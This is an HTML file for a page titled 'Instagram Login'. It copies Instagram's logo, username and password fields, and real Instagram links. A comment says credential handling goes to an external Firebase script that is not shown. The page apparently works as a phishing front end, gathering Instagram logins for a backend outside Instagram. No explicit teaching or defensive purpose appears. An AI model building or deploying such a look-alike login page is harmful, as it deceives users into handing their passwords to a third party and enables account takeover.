<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Instagram Login</title>
    <link href="https://fonts.googleapis.com/css?family=Poppins:300,400,500&display=swap" rel="stylesheet">
    <link rel="stylesheet" href="styles.css">
</head>
<body>

<div id="wrapper">
    <div class="main-content">
        <div class="header">
            <img src="./insta.png" alt="Instagram Logo">
        </div>
        <div class="l-part">
            <input type="text" placeholder="Username" class="input-1" id="username">
            <div class="overlap-text">
                <input type="password" placeholder="Password" class="input-2" id="password">
                <a href="https://www.instagram.com/accounts/password/reset/">Forgot?</a>
            </div>
            <button class="btn" id="login-btn">Log in</button>
        </div>
    </div>
    <div class="sub-content">
        <div class="s-part">
            Don't have an account? <a href="https://www.instagram.com/accounts/emailsignup/">Sign up</a>
        </div>
    </div>
</div>

<!-- âœ… External JavaScript (Handles Firebase) -->
<script type="module" src="firebase.js"></script>

</body>
</html>
